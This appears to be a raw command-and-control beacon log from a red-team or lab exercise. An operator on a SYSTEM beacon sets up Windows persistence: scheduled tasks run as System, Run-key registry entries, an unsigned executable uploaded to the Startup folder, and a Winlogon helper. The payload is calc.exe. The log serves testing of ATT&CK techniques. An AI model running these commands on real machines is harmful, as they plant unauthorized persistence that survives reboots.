02/05 10:06:38 [metadata] 172.17.2.54 <- 172.17.2.54; computer: A-PC; user: SYSTEM *; pid: 3256; os: Windows; version: 6.1; beacon arch: x86 (x64)
02/05 10:07:36 [task] 计划任务运行rundll32
02/05 10:07:44 [task] 新增计划任务schtasks /create /tn "test" /tr c:\window\system32\calc.exe /st 14:20 /sc once
02/05 10:08:30 [checkin] host called home, sent: 209 bytes
02/05 10:08:30 [output]
received output:
错误: 帐户名与安全标识间无任何映射完成。
(40,4):LogonType:

02/05 10:08:30 [output]
received output:
错误: 帐户名与安全标识间无任何映射完成。
(39,4):LogonType:

02/05 10:09:03 [input] <neo> shell schtasks /create /tn "test" /tr c:\window\system32\calc.exe /st 14:20 /sc once
02/05 10:09:03 [task] Tasked beacon to run: schtasks /create /tn "test" /tr c:\window\system32\calc.exe /st 14:20 /sc once
02/05 10:09:30 [checkin] host called home, sent: 109 bytes
02/05 10:09:31 [output]
received output:
错误: 帐户名与安全标识间无任何映射完成。
(39,4):LogonType:

02/05 10:11:06 [input] <neo> shell schtasks /create /tn "test" /tr c:\window\system32\calc.exe /st 14:20 /sc once /ru System
02/05 10:11:06 [task] Tasked beacon to run: schtasks /create /tn "test" /tr c:\window\system32\calc.exe /st 14:20 /sc once /ru System
02/05 10:11:31 [checkin] host called home, sent: 120 bytes
02/05 10:11:31 [output]
received output:
成功: 成功创建计划任务 "test"。


02/05 10:21:57 [input] <neo> shell schtasks /create /tn "test" /tr c:\window\system32\calc.exe /st 14:20 /sc once /ru System
02/05 10:21:57 [task] Tasked beacon to run: schtasks /create /tn "test" /tr c:\window\system32\calc.exe /st 14:20 /sc once /ru System
02/05 10:22:31 [checkin] host called home, sent: 120 bytes
02/05 10:22:31 [output]
received output:
错误: 任务名 test 已经存在。
要替换它吗(Y/N)?

02/05 10:22:48 [input] <neo> y
02/05 10:22:48 [error] Unknown command: y
02/05 10:22:54 [input] <neo> shell y
02/05 10:22:54 [task] Tasked beacon to run: y
02/05 10:23:11 [input] <neo> shell schtasks /create /tn "test" /tr c:\window\system32\calc.exe /st 14:20 /sc once /ru System && y
02/05 10:23:11 [task] Tasked beacon to run: schtasks /create /tn "test" /tr c:\window\system32\calc.exe /st 14:20 /sc once /ru System && y
02/05 10:23:31 [checkin] host called home, sent: 157 bytes
02/05 10:23:31 [output]
received output:
'y' 不是内部或外部命令，也不是可运行的程序
或批处理文件。


02/05 10:23:31 [output]
received output:
错误: 任务名 test 已经存在。
要替换它吗(Y/N)?

02/05 10:25:43 [input] <neo> shell schtasks /create /tn "test2" /tr c:\window\system32\calc.exe /st 14:20 /sc once /ru System && y
02/05 10:25:43 [task] Tasked beacon to run: schtasks /create /tn "test2" /tr c:\window\system32\calc.exe /st 14:20 /sc once /ru System && y
02/05 10:26:31 [checkin] host called home, sent: 126 bytes
02/05 10:26:31 [output]
received output:
成功: 成功创建计划任务 "test2"。
'y' 不是内部或外部命令，也不是可运行的程序
或批处理文件。


02/05 10:32:09 [input] <neo> shell schtasks /delete /tn "test2" /u System
02/05 10:32:09 [task] Tasked beacon to run: schtasks /delete /tn "test2" /u System
02/05 10:32:20 [input] <neo> shell schtasks /delete /tn "test" /u System
02/05 10:32:20 [task] Tasked beacon to run: schtasks /delete /tn "test" /u System
02/05 10:32:32 [checkin] host called home, sent: 137 bytes
02/05 10:32:32 [output]
received output:
错误: 无效语法。指定系统名之前无法指定用户名。
请键入 "SCHTASKS /?" 了解用法信息。


02/05 10:32:32 [output]
received output:
错误: 无效语法。指定系统名之前无法指定用户名。
请键入 "SCHTASKS /?" 了解用法信息。


02/05 10:32:50 [input] <neo> shell schtasks /delete /tn "test2"
02/05 10:32:50 [task] Tasked beacon to run: schtasks /delete /tn "test2"
02/05 10:32:57 [input] <neo> shell schtasks /delete /tn "test"
02/05 10:32:57 [task] Tasked beacon to run: schtasks /delete /tn "test"
02/05 10:33:32 [checkin] host called home, sent: 117 bytes
02/05 10:33:32 [output]
received output:
警告: 确实要删除任务 "test2" 吗 (Y/N )? 错误: 句柄无效。


02/05 10:33:32 [output]
received output:
警告: 确实要删除任务 "test" 吗 (Y/N )? 错误: 句柄无效。


02/05 10:36:34 [input] <neo> shell schtasks /create /tn "test" /tr c:\window\system32\calc.exe /st 14:20 /sc once /ru System
02/05 10:36:34 [task] Tasked beacon to run: schtasks /create /tn "test" /tr c:\window\system32\calc.exe /st 14:20 /sc once /ru System
02/05 10:37:32 [checkin] host called home, sent: 120 bytes
02/05 10:37:33 [output]
received output:
成功: 成功创建计划任务 "test"。


02/05 10:45:26 [input] <neo> shell schtasks /create /tn "test" /tr c:\window\system32\calc.exe /st 14:20 /sc once /ru System
02/05 10:45:26 [task] Tasked beacon to run: schtasks /create /tn "test" /tr c:\window\system32\calc.exe /st 14:20 /sc once /ru System
02/05 10:45:33 [checkin] host called home, sent: 120 bytes
02/05 10:45:33 [output]
received output:
成功: 成功创建计划任务 "test"。


02/05 10:55:00 [task] 通过reg命令设置注册表项
02/05 10:55:33 [checkin] host called home, sent: 146 bytes
02/05 10:55:33 [output]
received output:
操作成功完成。


02/05 10:58:16 [task] 这里请放任意一个不带签名的文件到 c:\Users\SYSTEM *\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\startup
02/05 10:58:17 [task] cd c:\Users\SYSTEM *\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\startup
02/05 10:58:17 [task] Tasked beacon to upload C:\Users\a\Desktop\codedate\ReadTeam\resource\T1060.exe as T1060.exe
02/05 10:58:17 [indicator] file: a5381751f68c2a8419151e1c82773502 169472 bytes T1060.exe
02/05 10:58:33 [checkin] host called home, sent: 169580 bytes
02/05 11:16:00 [task] 通过reg命令设置注册表项
02/05 11:16:33 [checkin] host called home, sent: 146 bytes
02/05 11:16:33 [output]
received output:
操作成功完成。


02/05 11:22:23 [task] 通过reg命令设置注册表项
02/05 11:22:23 [task] cd C:\Windows\System32\
02/05 11:22:34 [checkin] host called home, sent: 174 bytes
02/05 11:22:34 [output]
received output:
操作成功完成。


02/05 11:27:28 [task] 通过reg命令设置注册表项
02/05 11:27:28 [task] cd C:\Windows\System32\
02/05 11:27:28 [task] Tasked beacon to run: REG ADD "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v T1060 /t REG_SZ /d "c:\window\system32\calc.exe" /f
02/05 11:27:34 [checkin] host called home, sent: 174 bytes
02/05 11:27:34 [output]
received output:
操作成功完成。


02/05 13:36:13 [input] <neo> 
02/05 13:36:13 [error] Unknown command: 
02/05 13:54:33 [task] 4hellloworld
02/05 13:54:45 [task] 设置Winlogon 加载项
02/05 13:55:02 [input] <neo> exit
02/05 13:55:02 [task] Tasked beacon to exit
